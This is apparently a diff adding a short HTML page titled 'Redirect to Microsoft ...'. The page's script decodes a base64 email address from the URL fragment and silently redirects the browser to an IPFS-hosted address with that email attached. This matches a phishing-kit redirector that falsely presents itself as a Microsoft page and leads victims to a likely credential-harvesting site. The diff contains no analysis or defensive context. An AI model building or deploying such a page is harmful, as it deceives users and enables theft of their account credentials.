@@ -1,0 +1,31 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
+<html>
+<head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <title>Redirect to Microsoft ...</title>
+</head>
+<body>
+<script>
+  function base64Decode(str) {
+    try {
+      return decodeURIComponent(atob(str).split('').map(function(c) {
+        return '%' + ('00' + c.charCodeAt(0).toString(16)).slice(-2);
+      }).join(''));
+    } catch (e) {
+      console.error('Invalid base64 string:', str);
+      return null;
+    }
+  }
+
+  var hash = window.location.hash;
+  if (hash !== "") {
+    hash = hash.substring(1); // Remove the '#' character
+    const email = base64Decode(hash);
+    if (email)
+ {
+      window.location.href = "https://bafkreiffbqgo3njawtchoo4pe6uivd52gsr4lsnanzwb7hsqzn7qf7bi7m.ipfs.dweb.link/#" + email;
+    }
+  }
+</script>
+</body>
+</html>
